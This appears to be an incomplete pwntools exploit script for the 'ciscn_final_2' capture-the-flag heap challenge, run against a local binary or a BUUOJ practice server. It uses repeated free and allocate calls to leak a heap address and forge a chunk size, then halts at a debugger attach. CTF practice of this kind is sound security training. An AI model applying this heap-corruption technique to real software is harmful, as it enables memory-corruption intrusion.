#coding:utf-8

import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_2')
			#io=process(['./ciscn_2019_es_2'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./ciscn_final_2')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28546)
			elf=ELF('ciscn_final_2')
			libc=ELF('../../x64libc/libc.so.6')


		def add(a):
			io.recv()
			io.sendline('1')
			io.sendlineafter('Please input new log info:',a)

		def input_int(num):
			io.sendlineafter('> ', '1')
			io.sendlineafter('>', '1')
			io.sendlineafter('your inode number:', str(num))

		def input_short(num):
			io.sendlineafter('> ', '1')
			io.sendlineafter('>', '2')
			io.sendlineafter('your inode number:', str(num))

		def remove_int():
			io.sendlineafter('> ', '2')
			io.sendlineafter('>', '1')

		def remove_short():
			io.sendlineafter('> ', '2')
			io.sendlineafter('>', '2')

		def show_int():
			io.sendlineafter('> ', '3')
			io.sendlineafter('>', '1')

		def show_short():
			io.sendlineafter('> ', '3')
			io.sendlineafter('>', '2')
		
		input_int(0)
		remove_int()
		input_short(0)
		remove_int()
		input_short(0)
		input_short(0)
		input_short(0)
		show_int()
		io.recv()
		io.recvuntil('your int type inode number :')
		recv = io.recvuntil('\n',drop=True)
		heap_addr = int(recv)
		if heap_addr < 0x100000000:
			heap_addr = 0x100000000 + heap_addr
			input_int(heap_addr + 0x80)
			input_int(0)
			input_int(0x91)




		gdb.attach(io)
		pause()
		io.interactive()
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	pass